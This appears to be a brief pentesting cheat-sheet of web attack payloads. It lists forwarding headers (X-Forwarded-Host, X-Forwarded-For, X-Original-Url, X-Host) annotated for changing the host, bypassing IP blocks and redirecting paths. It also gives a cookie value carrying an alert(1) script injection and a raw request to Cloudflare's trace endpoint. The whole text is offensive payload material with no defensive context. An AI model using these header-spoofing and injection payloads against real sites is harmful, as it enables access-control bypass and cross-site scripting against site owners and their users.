
////// HOST headers
X-Forwarded-Host: /// change host
X-Forwarded-Scheme: /// change host
X-Forwarded-For: /// bypass ip restriction block 
X-Original-Url: /// redirect to any path 
X-Host: /// if you have victim user agent


///// HOST cookie
any-cookie=someString"-alert(1)-"someString


GET /cd-cgi/trace HTTP/1.1
Host: cloudflare.com